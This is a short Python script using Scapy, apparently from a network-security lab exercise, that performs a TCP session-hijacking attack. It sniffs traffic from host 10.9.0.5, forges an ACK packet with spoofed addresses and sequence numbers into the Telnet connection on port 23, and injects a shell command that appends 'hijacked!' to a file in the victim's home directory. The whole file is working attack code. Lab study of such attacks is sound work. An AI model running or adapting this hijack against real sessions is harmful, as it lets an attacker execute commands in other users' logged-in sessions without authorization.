#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(sport=pkt[TCP].dport, dport=23,
              flags="A",
              seq=pkt[TCP].ack, ack=pkt[TCP].seq+1)
        data = "echo \"hijacked!\" >> ~/malicious.out\n\0"
        pkt = ip/tcp/data
        ls(pkt)
        send(pkt, verbose=0)

f = f'tcp and src host 10.9.0.5'
pkt = sniff(iface='br-d277ca74e6d7', filter=f, prn=spoof_pkt)
